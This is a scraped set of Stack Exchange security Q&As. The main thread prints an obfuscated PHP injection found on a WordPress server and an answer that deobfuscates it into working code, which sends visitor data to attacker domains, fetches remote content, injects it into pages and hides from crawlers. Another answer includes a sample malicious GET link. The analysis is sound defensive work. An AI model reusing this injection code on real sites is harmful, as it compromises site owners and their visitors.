<p>A variation I have seen is that developers have a locked-down corporate build, but can do whatever they want within virtual machines. However, this can be annoying for developers, as VMs have reduced performance, and the security benefits are not that great. So it's more common to see developers simply having full access to their own workstation.</p>
","135366"
"Is this a backdoor?","15791","","<p>I found the code below on my customers site. It looks like a typical backdoor hidden with hexadecimal, but I'm not 100% sure.</p>

<pre><code>&lt;?php if(!isset($GLOBALS[""\x61\156\x75\156\x61""])) { $ua=strtolower($_SERVER[""\x48\124\x54\120\x5f\125\x53\105\x52\137\x41\107\x45\116\x54""]); if ((! strstr($ua,""\x6d\163\x69\145"")) and (! strstr($ua,""\x72\166\x3a\61\x31""))) $GLOBALS[""\x61\156\x75\156\x61""]=1; } ?&gt;&lt;?php $zdsnpbzghe = 'x5c%x7825)m%x5c%x7825=*h%x5c%x7825)m%x5c%x7825):fmji%x5c%x7878:&lt;##:&gt;5c%x7860QUUI&amp;e_SEEB%x5-%x5c%x7824gps)%x5c%x7825j&gt;1&lt;%x5c%x7825j=tj{fpg)%x5c%xX;%x5c%x7860msvd}R;*msv%x5c%x7825:osvufs:~928&gt;&gt;%x5c%x7822:ftmbg39*56A:&gt;:8:|:7#6#)tutC%x5c%x7827&amp;6&lt;*rfs%x5c%x78257-K)fujs%x5c%x7878X6&lt;#o]o]Y%x5c%x7825of.)fepdof.%x5c%x782f#@#%x5c%x782fqp%x5c%x7825&gt;5h%x55c%x7825tww**WYsboepn)%x5c%x78258:}334}472%x5c%x7824&lt;!%x5c%x7825mm!&gt;!#]y81]273]y76]258]y6g]273]y76]2715hIr%x5c%x785c1^-%x5c%x7825r%x5c%x785c2^-%x5c%x786]267]y74]275]y7:]268]y7f#&lt;!%x5c%x7825tww!&gt;!)323ldfidk!~!&lt;**qp%x5c%x7825!-uyfu%x5c%x7825)3of)fepdof%x5464]284]364]6]234]342]58]24]31#-%x5782f#o]#%x5c%x782f*)323zbe!-#jt0*?]+^?]_%x5c%x785c}X%fmy%x5c%x7825)utjm!|!*5!%x5c%x7827!hmg%x5c#)fepmqyf%x5c%x7827*&amp;7-n%x5c%x7860hfsq)!sp!*#ojneb#-278]225]241]334]368]322]3]364]6]2{**u%x5c%x7825-#jt0}Z;0]=]0#)2q%x5c%x7825l}S;2-u%x5c%x7825!-#2#%x5c%160%x28%42%x66%152%x66%147%x67%42%x2c%163%y35]256]y76]72]y3d]51]y35]274]y4:]82ovg+)!gj+{e%x5c%x7825!osvufs!*!+A!&gt;!{e%x5c%x7825)!&gt;&gt;%x5c%x7c%x7825iN}#-!tussfw)%x!isset($GLOBALS[""%x61%156%x75%156%x61""])))) %x7825cIjQeTQcOc%x5c%x782f#00#W~!Ydrr)%x5c%x7825r%x5c%x7878Bsfuvsox7825)Rd%x5c%x7825)Rb%x5c%x7825))!gj!&lt;*#cd2bge56+99386c!&lt;2p%x5c%x7825%x5c%x787f!~!&lt;##!&gt;!2p%%x7825)!gj!|!*1?hmg%x5c%x7825)!gj!&lt;**2-4-bub6&lt;.3%x5c%x7860hA%x5c%x7827pd%x5c%x78256%x7825:|:*r%x5c%x7825:-t%x5c%x782%x782f#%x5c%x7825#%x5c%xx7827;!&gt;&gt;&gt;!}_;gvc%x5c%x7825}&amp;;ftmbg}%x5c%x787f;7824-%x5c%x7824]y8%x5cx7825r%x5c%x7878&lt;~!!%x5c%x7825s:N}#-%x5c%x7825o:W%jyf%x5c%x7860439275ttfsqnpdov{h19275j{hnpd19275fubmgoj{h1:|:OBSUOSVUFS,6&lt;*msv%x5c%x78257-MSV,6&lt;*)ujojRx5c%x7824-%x5c%x7824b!&gt;!%x5c%x7825yy)#}#-#%x5c%x7824-%x5c%x7824-tus85csboe))1%x5c%x782f3g%x5c%x7825)!gj!~&lt;ofmyx5c%x7827pd%x5c%x78256|6.7eu{66~67&lt;&amp;w6&lt;*&amp;7-#o]s]o]s]c%x786057ftbc%x5c%x787f!|!*uyfu%x5c%x7827k:!ftmf!}Z;^nbsbq%x5c%x7825%xx7825b:&lt;!%x5c%x7825c:&gt;%x5c%x7825s:%x5c%x785c%x5c%x7825j:^&lt;!%x5c%787f_*#fubfsdXk5%x5c%x5c%x78e%x5c%x78b%x5c%x7825ggg!&gt;!#]y81]273]y76]258x7825bG9}:}.}-}!#*&lt;%x5c%x7825nfd&gt;%x5c3:]68]y76#&lt;%x5c%x78e%x5c%x78b,;uqpuft%x5c%x7860msvd}+;!&gt;!}%x5c%%x5c%x7860TW~%x5c%x7824&lt;%xx7878:-!%x5c%x7825tzw%x5c%x782f%x5c%x7317]445]212]445]43]321]87f&lt;*X&amp;Z&amp;S{ftmfV%x5c%x78%x78604%x5c%x78223}!+!&lt;+{e%x5c%x7825+*!*+fepdfe{h+{d%x5c%x7825)+opjudc%x7825:&lt;**#57]38y]47]67y]37]88y]27]28yx7825w%x5c%x7860%x5c%x785c^&gt;Ew:Qb:Qc:W~!%x59]274]y85]273]y6g]273]y76]%x5c%x7825)ftpmdR6&lt;*id%x5c%x7825)dfyfR%x5c%x7827tfs%x5c%x78256&lt;*!osvufs}w;*%x5c%x787f!&gt;&gt;%x5c%x7822!pd%x5x5c%x7825!&lt;**3-j%x5c%x7825-bubE{h%x5c%x7825)sutcvt-#w#)ldbqov&gt;*o%x5c%x7827id%x5c%x78256&lt;%x5c%x787fw6*%x5c%x787f_*#uj4]275]D:M8]Df#&lt;%x5c%x7825tdz&gt;#L4]275L3]248L3P6L1M5]Dx7825zB%x5c%x7825z&gt;!HB%x5c%x7860SFTV%x5c%x7860QUUIy76]61]y33]68]y34]68]ypd!opjudovg!|!**#j{hnpd#)tutjyf%x5c%x7860opjudovg%x5c%x7822)!gj}1~ebfsX%x5c%x7827u%x5c%x7825)7fmji%x5c%x78786&lt;x7860opjudovg)!gj!|!*msv%x5c%x7825)}k~~~&lt;ftmbg!osvufs17-SFEBFI,6&lt;*127-UVPFNJU,6&lt;*27-SFGT%x7825j,,*!|%x5c%x7824-%x5c%x7824gvodujpo!%x5c%x7824-%x5c%x7824y7gA%x5c%x7827doj%x5c%x78256&lt;%xc%x782f#)rrd%x5c%x782f#00;quui#&gt;.%x5c%x7825!&lt;***fufs:~:&lt;*9-1-r%x5c%x7825)s%x5c!&gt;!#]y84]275]y83]273]y76]277fnbozcYufhA%x5c%x78272qj%x5c%x78256&lt;^#zsfvr#%x5c%x785cq%x5fmjg}[;ldpt%x5c%x7825}K;%x5c%x7860ufldpt}c%x7825!&lt;*#}_;#)323ldfid&gt;}&amp;;!osvufs}825!*3!%x5c%x7827!hmg%x5c%x7825!)!gj!&lt;2,*j%xgj6&lt;*doj%x5c%x78257-C)fepmqnjA%x5c%x7827&amp;6&lt;.fmjc%x7827rfs%x5c%x78256~6&lt;%x5c%x787fw6&lt;*K)ftpmdXA6|7**197-278256&lt;.msv%x5c%x7860dz)%x5c%x7825bbT-%x5c%x7825bT-%x5c%x7825hW~%x5c%x7825fdy)c%x7825)!gj}Z;h!opjudovg}{;#)tutjyf%x5c%x7860{66~6&lt;&amp;w6&lt;%x5c%x787fw6*CW&amp;)7%x5c%x7860hA%x5c%x7827pd%x5c%x78256&lt;pd%x5c%x7825w6Z5297e:56-%x5c%x7878r.985:52985-t.98]K4]65]D8]86]y31]285]82]y76]62]y3:]84#-!OVMM*&lt;%x22%51%x29%51%x29%73"", NULL); };)gj}l;33bq}k;opjudovg}%xif((function_exists(""%x6f%142%x5f%163%x74%141%x72%164"") &amp;&amp; (x74%162%x5f%163%x70%154%x69%164%50%x22%134%x78%62%x35%16x7827;mnui}&amp;;zepc}A;~!}%x5c%x787f;!|!}{56&lt;pd%x5c%x7825w6Z6&lt;.4*f%x5c%x7825)sf%x5c%x7878pmpusut)tpqssutRe%x5c%25mm)%x5c%x7825%x5c%ubq#%x5c%x785cq%x5c%x7825%x5c%x7827jsv%x5c%x787f&lt;*XAZASV&lt;*w%x5c%x7825)ppde&gt;u%x5c%x7825V&lt;%x7824-%x5c%x7824]26%x5c%x5c%x7825Z&lt;#opo#&gt;b%x5c%x7825!*##&gt;&gt;X)!2272qj%x5c%x7825)7gj6&lt;**2qj%x5c%x7825x5c%x7825Z&lt;^2%x5c%x785c7%x65"",""%x65%166%x61%154%]#%x5c%x782fr%x5c%x7825%x5c%x7860{6:!}7;!}6;##}C;!&gt;&gt;!}W;utpi}Y;tuofuopd%x5c%x7860ufh%x5c%x786027,*b%x5c%x7827)fepd787f%x5c%x787f%x5c%x787f&lt;u%x5c%x7825V%x5c%x7827{ftmfV%x5c%x7x7860%x5c%x7878%x5c%x7822l:!}V;3q%x5c%x7825}U;y]}R;2]},;osvufs}%x5c%x5c%x7825)utjm6&lt;%x5c%x787fw6*CW&amp;)7gj6&lt;*K)ftpmdXA6~6&lt;u%x5c%x78257&gt;%x5c7825%x5c%x7824-%x5c%x7824*&lt;!~!dsfbuf%x5cftsbqA7&gt;q%x5c%x78256&lt;%x5c%x787fw6*%x5c%x##-!#~&lt;%x5c%x7825h00#*&lt;%x5c%x7825nfd)##Qtpz)#]341]88M4P8]37]%x5c%x7825,3,j%x5c%x7825&gt;j%x7824]25%x5c%x7824-%x5#65,47R25,d7R17,67R37,#%x5c%x782fq%x5c%x7825&gt;U&lt;#16,47R57,2824)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#mhpph#)zbssb!-#}#)fepmqnj!%x5c%x782f!#0#)idubn%tussfw)%x5c%x7825zW%x5c%x7825h&gt;EzH,2W%x5c%x7825{ $GLOBALS[""%x61%156%x75%156%x61""]=1; function fjfgg($n){return chr(ox5c%x7825%x5c%x7824-%x5c%x7824y4%x5c%x:h%x5c%x7825:&lt;#64y]5&gt;}R;msv}.;%x5c%x782f#%x5c%x7W#-#C#-#O#-#N#*%x5c%x7824%x5c%x782f%x5c%x7825kj:-!OVMM*&lt;(&lt;%7!hmg%x5c%x7825)!gj!&lt;2,*j%x5c%x7825-#1]#-bubE{h%x5c%x7825)t&amp;b%x5c%x7825!|!*)323zbek!~!#&gt;q%x5c%x7825V&lt;*#fopoV;hojepdoF.uofuop%x7825&gt;%x5c%x782fh%x581]K78:56985:6197g:74985-rr.93e:5597f-s.973:8297f:6f+9f5d816:+946:ce44#)zbssb!&gt;!ssbnpe_GMFT%x5c%x7860QIQ&amp;f_UTPI%xx28%151%x6d%160%x6c%157%x64%145%x28%141%x72%162%x61%171%x5f%155%x61]47y]252]18y]#&gt;q%x5c%x7825&lt;#762]67y]562]38y]572]48y]#&gt;m%x5c#7e:55946-tr.984:75983:48984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#&lt;%x5c256&lt;C&gt;^#zsfvr#%x5c%x785cq%x5c%x78257**^#zsfvr#%x5c%x75c%x78e%x5c%x78b%x5c%x78!sboepn)%x5c%x7825epnbss-%x5c%x7825r%x5c%x7878W~!Ypp2)%x5c%7R66,#%x5c%x782fq%x5c%x7825&gt;2q%x5c%x7825&lt;#g6R85,67R37,18Rc%x7825!&lt;*::::::-111112)eobs%x5c%x7860un%x7824-%x5c%x7824&lt;%x5c78]y3f]51L3]84]y31M6]y3e]81#%x5c%x782f5]Ke]53Ld]53]Kc]55Ld]55#*&lt;%x5c%6&lt;%x5c%x787fw6*CWtfs%x5c%x7825)7gj6&lt;*id%x7825ww2!&gt;#p#%x5c%x782f#p#%x5c%x782f%x5c%x78255.)1%x5c%x782f14+9**-)1%x5c%x782f2986+7**^%x5c%x782f%x5c%#&lt;%x5c%x7825t2w&gt;#]y74]273]y76]252]y85]256]y6g]257]y8)hopm3qjA)qj3hopmA%x5c%x78273qj%x5c%x78256&lt;*Y%x5c%x7825)%x5c%x7827,*e%x5c%x7827,*d%x5c%x7827,*c%x5c%x78c%x7860FUPNFS&amp;d_SFSFGFS%x5c%x7860QUUI&amp;c_UOFb:&gt;%x5c%x7825s:%x5c%x785c%x5c%x7825j:.2^,%x5c%%x7860gvodujpo)##-!#~&lt;#%x5c%x782f%x5c%x7825%x5c%x7824-%x5c%x7824!%x782f20QUUI7jsv%x5c%x78257UFH#%x5%x7825)gpf{jt)!gj!&lt;*2bd%x5c%x7825-#1GO%x5c%x7822#)fepmqyfA&gt;2b%x*mmvo:&gt;:iuhofm%x5c%x7825:-5ppde:4:|:**#ppde#)tutjyf%x5c%x5c%x7825w:!&gt;!%x5c%x78246767~6&lt;Cw6&lt;pd%x5c%x7825w6Z6&lt;.5%x5c%x7860hAx5c%x7825c:&gt;1&lt;%x5c%x7825b:&gt;1&lt;!gps)%x5c%x7825j:&gt;1&lt;%x5c%x7825j:=trd($n)-1);} @error_reporting(0); preg_replace(""%x2f%50%x2e%52%x29%585cq%x5c%x7825)ufttj%x5c%x7822)gj6&lt;^#Y#%x5c%x785cq%x5c%x7825%x5c%x7827Y%x5c%x5]D6#&lt;%x5c%x7825fdy&gt;#]D4]273]D6P2L5P6]y6gP7L6M7]DwN;#-Ez-1H*WCw*[!%x5c%x7825rN}#QwTW%x5c%x782]y7d]252]y74]256#&lt;!%x5c%x7825ff2!&gt;!bssbz)%x5c%5c%x7878;0]=])0#)U!%x5c%x7827z&lt;jg!)%x5c%x7825z&gt;&gt;2*!%x5c%x7825z&gt;3&lt;!fmtf!%x5c7;utpI#7&gt;%x5c%x782f7rfs%x5c%x78256&lt;#o]1%x5c]y6g]273]y76]271]y7d]252]y74]256#&lt;!%x5c%x7825ggg)(0)%x5]y3:]62]y4c#&lt;!%x5c%x7825t::!&gt;!%x5c%x7824Ypp3)%x5c%x7825cB%x5D#)sfebfI{*w%x5c%x7825)kV%x5c%x7878{**#k#)tutjyf%x5c%%x7825tpz!&gt;!#]D6M7]K3#&lt;%x5c%x7825yy&gt;#]D6]281L1#%x5c%x782f#M5]DgPdXA%x5c%x7827K6&lt;%x5c%x787fw6*3qj%x5c%x78257&gt;%x5c%x78c%x782f+*0f(-!#]y76]277]y72]265j^%x5c%x7824-%x5c%x7824tvctus)%x5c%x7825%825i%x5c%x785c2^&lt;!Ce*[!%x5cpqsut&gt;j%x5c%x7825!*9!%x5c%x7827!hmqj%x5c%x78257-K)udfoopdXA%x5c%x7822)7gj83]427]36]373P6]36]73]83]238M7]381]211M5]67]452]88]5]48]32M3]ojRk3%x5c%x7860{666~6&lt;&amp;w6&lt;%x5c%x787fw5%x3a%146%x21%76%x21%50%x5c%x7825%x5c%x7878:!&gt;#]y3g]61]y3f]63]y4]275]y83]248]y83]256]y81]265]y72]254]y76#&lt;%x5c%x7825tmw5]y39]271]y83]256]y78]248]y83]256]y81]265]y72]254]822!ftmbg)!gj&lt;*#k#)usbut%x5c%x7860cpV%x5c%x787f%x5c%xbss-%x5c%x7825r%x5c%x7878B%x5c%x7825h&gt;#]y31]278]y3e]&lt;pd%x5c%x7825w6Z6&lt;.2%x5c%x7860hA%x5c%x7827pd%x5c%x78256&lt;C%E{h%x5c%x7825)sutcvt)esp&gt;hmg%x5c%x7825!&lt;12&gt;j%x5c%x7825!|!*#91y2P4]D6#&lt;%x5c%x7825G]y6d]281Ld]245]K2]28c%x7825tdz*Wsfuvso!%x5c%x7825bss%x5c%x7&gt;!fyqmpef)#%x5c%x7824*&lt;!%x5c%x7825kj:!&gt;!#]y3d]51]5c%x785cSFWSFT%x5c%x7860%x5c%x7825}X;!sp!*#opo#&gt;]c9y]g2y]#&gt;&gt;*4-1-bubE{h%x5c%x7825)sutcvt)!gj!|!*bubE{h%x5c%x7825)j{hnx5c%x7825)}.;%x5c%x7860UQPMSVD!-id%x5c%x7825)uqpuft%x5c%x7860msvd}x5c%x7824&lt;!%x5c%x7825tzw&gt;!#]y76]277]y72]265]y35c%x7825!-#1]#-bubE{h%x5c%x7825)tpqsut&gt;j%x5c%x7825!*72!%x5c%x782x5c%x7824-%x5c%x7824*!|!%x5c%x7824-%x5c%x7824%x5c%x785c%x5c%x7822b%x5c%x7825!&gt;!2p%x5c%x7825!*3&gt;?*2b%x5c5c%x7825c*W%x5c%x7825eN+#Qi%x5c%x785c1^W%x5c%x7825c!&gt;!%x5c%x75c%x7825!&lt;*qp%x5c%x7825-*.%x5c%x7825)euhA)3of&gt;25)3of:opjudovg&lt;~%x5c%x7824&lt;!%x5c%x7825o:!&gt;!%x5c%x78242178}527}85c%x7825!|!*!***b%x5c%x7825)sf%x5c%x7878pmpusut!-#j0#!%x5c%x7826&lt;*QDU%x5c%x7860MPT7-NBFSUT%x5c%x7860LDPT7-UFOJ%x5c%x7860GB)fubfs2fh%x5c%x7825)n%x5c%x7825-#+I#)q%x5c%x7825:&gt;:r%x5c%x7825:|:**t%&gt;1*!%x5c%x7825b:&gt;1&lt;!fmtf!%x5c%x78255c%x787fw6*%x5c%x787f_*#fmjgk4%x5c%x7860{6~6&lt;tfs%x5c%x7825wc%x7824-!%x5c%x7825%25hOh%x5c%x782f#00#W~!%x5c%x7825t2w)##Qtjw)#]82#-#!#-%x5c%x7825tmw)%xj{fpg)%x5c%x7825s:*&lt;%x5c%x7825j:,,Bjg!)%x5c%x7825j:&gt;%x782f7&amp;6|7**111127-K)qpt)%x5c%x7825z-#:#*%x5c%x7824-%x5c%x7824!&gt;!tus%x5c%x7860sfqmbdf)%%x5c%x7824-%x5c%x7824*&lt;!%x5c%x7824c%x7825z!&gt;2&lt;!gps)%x5c%x7825j&gt;1&lt;%x5c%x7825j=6[%x5c%x5c%x782400~:&lt;h%x5c%x7825_t%x5c%x7825:osv&gt;qp%x5c%x7825!|Z~!&lt;##!&gt;!2p%x%x7825z&gt;2&lt;!%x5c%x7825ww2)%x5c%x7825wbd%x5c%x7825!&lt;5h%x5c%x7825%x5c%x782f#0#%x5c%x782f*#npd%x56*CW&amp;)7gj6&lt;.[A%x5c%x7827&amp;6&lt;%x5c%x787fw6*%x5c%x787f_*#[k2%x5c%x7882f#%x5c%x782f},;#-#}+;%x5c%x7825-qp%x5c%x7825)54l}%x5c%x7827;%x5c%x78257%x5c%x782f7#@#7%x5c%x782f7^#i33]65]y31]53]y6d]281]y43]78]y33]65]y31]55]y271]y7d]252]y74]256]y39]252]y83]273]y72]282#&lt;!%x5c%x7825tjw!&gt;!#]y8%x7825fdy&lt;Cb*[%x5c%x7825h!&gt;!%x5c%x7825t%x5c%x7827pd%x5c%x782%x5c%x787f;!opjudovg}k~~9{d%-bubE{h%x5c%x7825)sutcvt)fubmgoj{hA!osvufs!~&lt;3,j%x5c%x7825&gt;j%x5c%x7gjZ&lt;#opo#&gt;b%x5c%x7825!**X)ufttj%x5c%x7822)gj!|!*nbsbq%x5c%x7825f!**#sfmcnbs+yfeobz+sfwjidsb%x5c%x7860bj+upcotn+qsvmt+f52]e7y]#&gt;n%x5c%x7825&lt;#372]58y]472]37y]672]48y]#&gt;s%x5c%x7825&lt;#462&lt;b%x5c%x7825%x5c%x787f!&lt;X&gt;b!|ftmf!~&lt;**9.-j%x5c%x7825/(.*)/epreg_replacepcxbdxfawf'; $ibnuwgraod = explode(chr((272-228)),'3721,60,1040,44,4913,69,6639,67,4175,25,5385,67,880,43,3781,56,7594,63,2006,29,6509,67,9756,21,3876,22,3532,51,1285,39,7868,58,1712,52,728,25,4442,69,9108,22,2767,44,228,65,6997,43,6357,34,3325,57,7457,39,8745,65,7272,52,4115,37,6100,56,3099,58,9571,37,3965,46,5581,53,6706,36,6742,41,3382,20,4551,40,1898,21,3499,33,3278,47,2964,29,8908,59,5905,39,2357,64,2864,35,1560,42,2525,52,7557,37,9442,64,4231,63,3157,41,144,24,8232,66,2035,34,1381,47,2421,40,3459,40,2811,53,10081,25,9805,67,3234,44,8344,64,5127,59,7423,34,1690,22,4651,27,2461,64,686,42,1241,44,7926,62,8163,69,2701,66,1205,36,4152,23,8472,39,6391,63,8572,47,9385,57,2993,49,6156,47,4294,20,293,52,5774,40,9321,28,8682,63,9935,55,4819,47,753,27,3898,47,1150,55,5322,63,68,22,6203,43,2649,30,5186,27,10054,27,4077,38,9872,63,540,58,1764,70,8115,48,5040,28,9506,65,3198,36,9777,28,168,60,1500,60,6454,55,2180,69,959,59,7763,53,4314,60,2156,24,4011,42,4700,58,5717,57,5213,38,7155,53,4374,68,3837,39,3696,25,6922,29,813,67,1357,24,633,53,8298,46,2331,26,9651,66,7657,56,3071,28,6048,52,496,44,9279,42,3042,29,5251,21,2249,39,4200,31,8810,63,0,68,5020,20,9990,64,5452,59,1324,33,8619,63,377,70,6876,46,4678,22,8967,20,8408,64,7354,42,1602,67,9130,66,4982,38,1428,22,4053,24,5814,22,2899,65,9196,34,90,54,4511,40,6292,65,8066,49,923,36,7095,60,1018,22,8511,61,7396,27,1084,66,5658,59,2629,20,4866,47,6832,44,447,49,8987,69,345,32,7816,52,5272,50,3583,53,5836,38,5511,70,7208,64,6783,49,2577,52,7988,39,5874,31,1969,37,9717,39,3402,57,4591,60,780,33,7496,61,2133,23,598,35,8027,39,1669,21,5991,57,1450,50,6576,63,9056,52,8873,35,6246,46,1834,64,2288,43,9230,49,5944,47,6951,46,9349,36,2069,26,5634,24,3945,20,2095,38,4758,61,5068,59,1919,50,7040,55,7324,30,7713,50,2679,22,9608,43,3636,60'); $hlrywdpqbc=substr($zdsnpbzghe,(44960-34854),(41-34)); if (!function_exists('kscpwxzuhr')) { function kscpwxzuhr($xjucvuiret, $bsoixxpekh) { $uzadkdkdcj = NULL; for($ylffdjxxwv=0;$ylffdjxxwv&lt;(sizeof($xjucvuiret)/2);$ylffdjxxwv++) { $uzadkdkdcj .= substr($bsoixxpekh, $xjucvuiret[($ylffdjxxwv*2)],$xjucvuiret[($ylffdjxxwv*2)+1]); } return $uzadkdkdcj; };} $jztylhmlin=""\x20\57\x2a\40\x74\150\x6f\157\x63\172\x77\144\x78\152\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x32\60\x36\55\x31\66\x39\51\x29\54\x20\143\x68\162\x28\50\x32\71\x35\55\x32\60\x33\51\x29\54\x20\153\x73\143\x70\167\x78\172\x75\150\x72\50\x24\151\x62\156\x75\167\x67\162\x61\157\x64\54\x24\172\x64\163\x6e\160\x62\172\x67\150\x65\51\x29\51\x3b\40\x2f\52\x20\156\x6f\153\x7a\142\x6d\165\x76\165\x6e\40\x2a\57\x20""; $nbbppijzpp=substr($zdsnpbzghe,(68445-58332),(68-56)); $nbbppijzpp($hlrywdpqbc, $jztylhmlin, NULL); $nbbppijzpp=$jztylhmlin; $nbbppijzpp=(752-631); $zdsnpbzghe=$nbbppijzpp-1; ?&gt;
</code></pre>

<p>If it actually is a backdoor, I'm curious about what it does, if someone's got the patient to interpret it.</p>

<p>Thank you in advance.</p>

<hr>

<p><strong>EDIT:</strong></p>

<p>My customer isn't involved in web development, and when I asked him about this code he'd certainly not seen it before.</p>

<p>I noticed now that the code is placed in the top of almost every file in a WordPress installation, as it would have been placed there automatically.</p>

<hr>

<p><strong>EDIT 2:</strong></p>

<p>The malicious code were in fact placed in every PHP file on the server, not only within WordPress.</p>
","<p>No. The backdoor is not on this script. This piece of highly obfuscated code contains a program to allow the hacker to dynamically append any HTML or javascript by randomly calling a server located at 31.184.192.250 with one of the four hostnames ""33db9538.com"", ""9507c4e8.com"", ""e5b57288.com"", ""54dfa1cb.com"".</p>

<p>The deobfuscated code looks something like this:</p>

<pre><code>// generate hostname
function random($arr, $qw) {
    $arr = array(""33db9538"", ""9507c4e8"", ""e5b57288"", ""54dfa1cb"");
    return $arr[rand(0, 1.125)].$qw;
}

// return hostname of malware-hosting server
function cqq($qw)
{
    return random($domarr, $qw);
}

// custom encoding
function en2($s, $q)
{
    $g = """";
    while (strlen($g) &lt; strlen($s)) {
        $q = pack(""H*"", md5($g.$q.""q1w2e3r4"")); # convert to binary string
        $g.= substr($q, 0, 8);
    }
    return $s^$g; # XOR, bits set in either $s or $g but not both
}

// g_* functions are four different ways to retrieve content from remote URL
function g_1($url)
{
    if(function_exists(""file_get_contents"") === false) return false;
    $buf = @file_get_contents($url);
    if($buf == """") return false;
    return $buf;
}

function g_2($url)
{
    if(function_exists(""curl_init"") === false) return false;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    $res = curl_exec($ch);
    curl_close($ch);
    if($res == """") return false;
    return $res;
}
....

// try progressively more complicated method if the previous one did not work
function gtd($url)
{
    $co = """";
    $co = @g_1($url);
    if($co !== false) return $co;
    $co = @g_2($url);
    if($co !== false) return $co;
    $co = @g_3($url);
    if($co !== false) return $co;
    $co = @g_4($url);
    if($co !== false) return $co;
    return """";
}

// encode server parameters
function k34($op, $text)
{
    return base64_encode(en2($text, $op));
}

// check if server parameters exist
function check212($param)
{
    if(!isset($_SERVER[$param])) $a = ""non"";
    else if($_SERVER[$param] == """") $a = ""non"";
    else $a = $_SERVER[$param];
    return $a;
}

// extract payload
function day212()
{
    $a = check212(""HTTP_USER_AGENT"");
    $b = check212(""HTTP_REFERER"");
    $c = check212(""REMOTE_ADDR"");
    $d = check212(""HTTP_HOST"");
    $e = check212(""PHP_SELF"");
    $domarr = array(""33db9538"", ""9507c4e8"", ""e5b57288"", ""54dfa1cb"");
    if(($a == ""non"") or ($c == ""non"") or ($d == ""non"") or strrpos(strtolower($e), ""admin"")
     or (preg_match(""/google|slurp|msnbot|ia_archiver|yandex|rambler/i"", strtolower($a))))
    {
        $o1 = """";
    }
    else {
        $op = mt_rand(100000, 999999);
        $g4 = $op.""?"".urlencode(urlencode(k34($op, $a).""."".k34($op, $b).""."".k34($op, $c)
         .""."".k34($op, $d).""."".k34($op, $e)));
        $url = ""http://"".cqq("".com"").""/"".$g4;
        $ca1 = en2(@gtd($url) , $op);
        $a1 = @explode(""!NF0"", $ca1);
        if(sizeof($a1) &gt;= 2) $o1 = $a1[1];
        else $o1 = """";
    }
    return $o1;
}

// uncompress html to buffer
function dcoo($cz, $length = null)
{
    if(false !== ($dz = @gzinflate($cz))) return $dz;
    if(false !== ($dz = @comgzi($cz))) return $dz;
    if(false !== ($dz = @gzuncompress($cz))) return $dz;
    if(function_exists(""gzdecode"")) {
        $dz = @gzdecode($cz);
        if(false !== $dz) return $dz;
    }
    return $cz;
}

// callback function to accept buffer and append code at bottom of html
function pa22($v)
{
    Header(""Content-Encoding: none"");
    $t = dcoo($v);
    if(preg_match(""/\&lt;\/body/si"", $t)) {
        return preg_replace(""/(\&lt;\/body[^\&gt;]*\&gt;)/si"", day212().""\n$1"", $t, 1);
    }
    else {
        if(preg_match(""/\&lt;\/html/si"", $t)) {
            return preg_replace(""/(\&lt;\/html[^\&gt;]*\&gt;)/si"", day212().""\n$1"", $t, 1);
        }
        else {
            return $t;
        }
    }
}

// start processing
ob_start(""pa22"");

/**** original code starts here ****/
....
</code></pre>

<p>The code above is capable of evading detection by major search engines and site administrator as it returns a normal page when certain criteria are matched. I am not able to find out what code is being appended possibly because the malware-hosting server also does some check to see if the request is coming from an infected server.</p>

<p>It appears that a Wordpress vulnerability was introduced by an unpatched version of the <a href=""https://wordpress.org/plugins/wysija-newsletters/"">MailPoet</a> plugin. This allows a hacker to upload a malicious script with the credential of an administrator into a Wordpress theme and execute that file by navigating to the URL. You can find more information from <a href=""http://blog.sucuri.net/2014/10/wordpress-websites-continue-to-get-hacked-via-mailpoet-plugin-vulnerability.html"">this security blog</a>.</p>

<p>The key takeaway from this incident is to backup your data frequently and update your software conscientiously.</p>
","71119"
"get vs post which is more secure?","15768","","<p>i have heard of programatically difference b/w get and post in web applications,Asking in curiosity which is more secure get method or post method in web applications,i expect answers in terms of protocols too (I.e in http and https)?</p>
","<p>POST is more secure than GET for a couple of reasons. </p>

<p>GET parameters are passed via URL. This means that parameters are stored in server logs, and browser history. When using GET, it makes it very easy to alter the data being submitted the the server as well, as it is right there in the address bar to play with. </p>

<p>The problem when comparing security between the two is that POST may deter the casual user, but will do nothing to stop someone with malicious intent. It is very easy to fake POST requests, and shouldn't be trusted outright. </p>

<p>The biggest security issue with GET is not malicious intent of the end-user, but by a third party sending a link to the end-user. I cannot email you a link that will force a POST request, but I most certainly can send you a link with a malicious GET request. I.E:</p>

<p><a href=""http://www.bankoftheinternet.com/control-panel/changepassword.php?newpass=hackedu"" rel=""noreferrer"">Click Here for the best free movies!</a></p>

<p>Edit:</p>

<p>I just wanted to mention that you should probably use POST for most of your data. You would only want to use GET for parameters that should be shared with others, i.e: /viewprofile.php?id=1234, /googlemaps.php?lat=xxxxxxx&amp;lon=xxxxxxx</p>
","33840"
"What should I do about Gmail ad asking me for password?","15762","","<p>I just got a pop-up after having logged on to Gmail. It said it was from <code>https://googleads.g.doubleclick.net</code> and asked for username and password.</p>

<p><a href=""https://i.stack.imgur.com/NAd5y.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/NAd5y.png"" alt=""Screenshot of login dialog.""></a></p>

<p>What should I do about this? Has anyone else seen this?</p>

<p>I did press cancel, nothing happened. The only add-on I have installed is HttpRequester. </p>
","<p><em>This seems unlikely but not unthinkable. From the information in your question and the supplied screenshot, it seems that the Google ad domain was or currently is compromised.</em> </p>

<h2>What to do now?</h2>

<p><strong>Firstly</strong>, make sure that you have antivirus and anti-spyware software installed and that this software (including your operating system) is up-to-date. <em>It is a good idea to let your antivirus and anti-spyware software run a full system scan.</em></p>

